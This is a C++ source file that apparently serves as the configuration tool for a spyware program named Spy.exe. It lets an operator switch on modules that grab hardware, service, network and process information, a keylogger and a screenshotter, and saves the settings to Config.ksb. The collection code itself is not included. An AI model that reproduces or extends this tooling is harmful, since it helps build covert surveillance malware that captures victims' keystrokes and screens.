#include "Output.h"
void Help(int val)
{
	if (val == 0)
	{
		cout << "\n\nHelp information\n\n"
			<< "exit - quit the program"
			<< "\nload - load file Config.ksb from //load//"
			<< "\ncreate - create file Config.ksb in //create//"
			<< "\n\n";
	}
	if (val == 1)
	{
		cout << "\n\nHelp information\n\n"
			<< "exit - quit from load to main"
			<< "\nset - set the parameters to module by marker 0,1,2,3,4,5,6,7,8 "
			<< "\nsave - save file Config.ksb to //save//"
			<< "\n\n";
	}
	if (val == 2)
	{
		cout << "\n\nHelp information\n\n"
			<< "exit - quit from create to main"
			<< "\nset - set the parameters to module by marker 0,1,2,3,4,5,6,7,8 "
			<< "\nsave - save file Config.ksb to //create//"
			<< "\n\n";
	}
}
void InitControl(control &C)
{
	C.stop = true;
	C.period[0] = 7200; C.period[1] = 7200; C.period[2] = 7200; C.period[3] = 7200; C.period[4] = 7200; C.period[5] = 7200;
	C.run[0] = true;
	C.run[1] = true;
	C.run[2] = true;
	C.run[3] = true;
	C.run[4] = true;
	C.run[5] = true;
	C.keylog = false;
	C.run_s = true;
	C.period_s = 7200;
}
void PrintControl(control &C)
{

	if (C.run[0] == false)
		cout << "0. Hardware information grabber will be stopped. Value: " << C.run[0] << " Period: " << C.period[0] << endl;
	else
		cout << "0. Hardware information grabber will work. Value: " << C.run[0] <<  " Period: " << C.period[0] << endl;

	if (C.run[1] == false)
		cout << "1. Service information grabber will be stopped. Value: " << C.run[1] << " Period: " << C.period[1] << endl;
	else
		cout << "1. Service information grabber will work. Value: " << C.run[1] << " Period: " << C.period[1] << endl;

	if (C.run[2] == false)
		cout << "2. System information grabber will be stopped. Value: " << C.run[2] << " Period: " << C.period[2] << endl;
	else
		cout << "2. System information grabber will work. Value: " << C.run[2] << " Period: " << C.period[2] << endl;

	if (C.run[3] == false)
		cout << "3. Network information grabber will be stopped. Value: " << C.run[3] << " Period: " << C.period[3] << endl;
	else
		cout << "3. Network information grabber will work. Value: " << C.run[3] << " Period: " << C.period[3] << endl;

	if (C.run[4] == false)
		cout << "4. Serial information grabber will be stopped. Value: " << C.run[4] << " Period: " << C.period[4] << endl;
	else
		cout << "4. Serial information grabber will work. Value: " << C.run[4] << " Period: " << C.period[4] << endl;

	if (C.run[5] == false)
		cout << "5. Process information grabber will be stopped. Value: " << C.run[5] << " Period: " << C.period[5] << endl;
	else
		cout << "5. Process information grabber will work. Value: " << C.run[5] << " Period: " << C.period[5] << endl;

	if (C.keylog == false)
		cout << "6. Keylogger will be stopped. Value: " << C.keylog << endl;
	else
		cout << "6. Keylogger will work. Value: " << C.keylog << endl;

	if (C.run_s == false)
		cout << "7. Screenshoter will be stopped. Value: " << C.run_s << " Period: " << C.period_s << endl;
	else
		cout << "7. Screenshoter will work. Value: " << C.run_s << " Period: " << C.period_s << endl;

	if (C.stop == false)
		cout << "8. Spy.exe will be stopped. Value: " << C.stop << endl;
	else
		cout << "8. Spy.exe will work. Value: " << C.stop << endl;

}
void Save(ofstream &out, control &C, char *filepath)
{
	out.open(filepath, ios::out);

	out << C.stop << endl;

	for (int i = 0; i < 6; i++)
		out << C.period[i] << endl;

	for (int i = 0; i < 6; i++)
		out << C.run[i] << endl;

	out << C.keylog << endl;
	out << C.run_s << endl;
	out << C.period_s << endl;

}
string Set(control &C)
{
	string choice, work;
	int i = 0;
	int counter = 0;
	bool work_b;
	int period = 0;

	do {
		cout << "set Marker: 0-8>> ";
		cin >> i;
		cout << endl;
	} while (i < 0 || i > 8);

	do {
		if (counter == 0)
			getline(cin, work);
		counter++;
		cout << "set Run: on//off>> ";
		getline(cin, work);
		cout << endl;
	} while (work != "on" && work != "off");

	do {
		cout << "set Period: 0-32767>> ";
		cin >> period;
		cout << endl;
	} while (period < 0 || period > 32767);

	counter = 0;

	if (i < 8)
	{
		if (work == "on")
			work_b = true;
		if (work == "off")
			work_b = false;
	}
	if (i == 8)
	{
		if (work == "on")
			work_b = true;
		if (work == "off")
			work_b = false;
	}

	if (i <= 5)
	{
		C.run[i] = work_b;
		C.period[i] = period;
	}
	if (i == 6)
	{
		C.keylog = work_b;
	}
	if (i == 7)
	{
		C.run_s = work_b;
		C.period_s = period;
	}
	if (i == 8)
	{
		C.stop = work_b;
	}

	cout << "\n\nSet up was succesfull! New parameters\n\n"; PrintControl(C); cout << endl << endl;

	do {
		if (counter == 0)
			getline(cin, choice);
		counter++;
		cout << "set Continue yes//no>> ";
		getline(cin, choice);
		cout << endl;
	} while (choice != "yes" && choice != "no");

	return choice;
}
string Set_Create(control &C)
{
	string choice, work;
	int i = 0;
	int counter = 0;
	bool work_b;
	int period = 0;

	do {
		cout << "set By default: yes//no>> ";
		getline(cin, choice);
		cout << endl;
	} while (choice != "yes" && choice != "no");

	if (choice == "yes")
		InitControl(C);
	else
	{
		for (int i = 0; i < 9; i++)
		{
			cout << "set for Marker: " << i << endl;

			do {
				cout << "set Run: on//off>> ";
				getline(cin, work);
				cout << endl;
			} while (work != "on" && work != "off");

			do {
				cout << "set Period: 0-32767>> ";
				cin >> period;
				cout << endl;
			} while (period < 0 || period > 32767);

			counter = 0;

			if (i < 8)
			{
				if (work == "on")
					work_b = true;
				if (work == "off")
					work_b = false;
			}
			if (i == 8)
			{
				if (work == "on")
					work_b = true;
				if (work == "off")
					work_b = false;
			}

			if (i <= 5)
			{
				C.run[i] = work_b;
				C.period[i] = period;
			}
			if (i == 6)
			{
				C.keylog = work_b;
			}
			if (i == 7)
			{
				C.run_s = work_b;
				C.period_s = period;
			}
			if (i == 8)
			{
				C.stop = work_b;
			}
		}
	}

	counter = 0;

	cout << "\n\nSet up was succesfull! New parameters\n\n"; PrintControl(C); cout << endl << endl;

	do {
		cout << "set Continue yes//no>> ";
		getline(cin, choice);
		cout << endl;
	} while (choice != "yes" && choice != "no");

	return choice;
}